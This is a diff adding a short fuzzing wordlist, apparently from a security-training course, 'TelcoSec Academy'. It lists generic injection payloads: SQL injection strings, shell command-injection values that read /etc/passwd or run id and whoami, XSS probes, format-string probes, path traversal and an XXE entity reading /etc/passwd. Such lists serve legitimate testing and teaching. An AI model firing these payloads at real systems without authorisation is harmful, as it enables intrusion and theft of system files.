@@ -1,0 +1,30 @@
+﻿# TelcoSec Academy - https://app.telcosec.net/
+
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+admin'--
+admin' #
+' UNION SELECT NULL,NULL,NULL--
+' OR 'a'='a
+; ls -la
+; cat /etc/passwd
+; id
+| whoami
+& ping -c 1 127.0.0.1
+`id`
+$(id)
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+%s%s%s%s%s
+%x%x%x%x
+%n%n%n%n
+\0
+\r\n
+\r\n\r\n
+../../../../../../etc/passwd
+../../../../../../windows/win.ini
+{ "json": "fuzz" }
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+
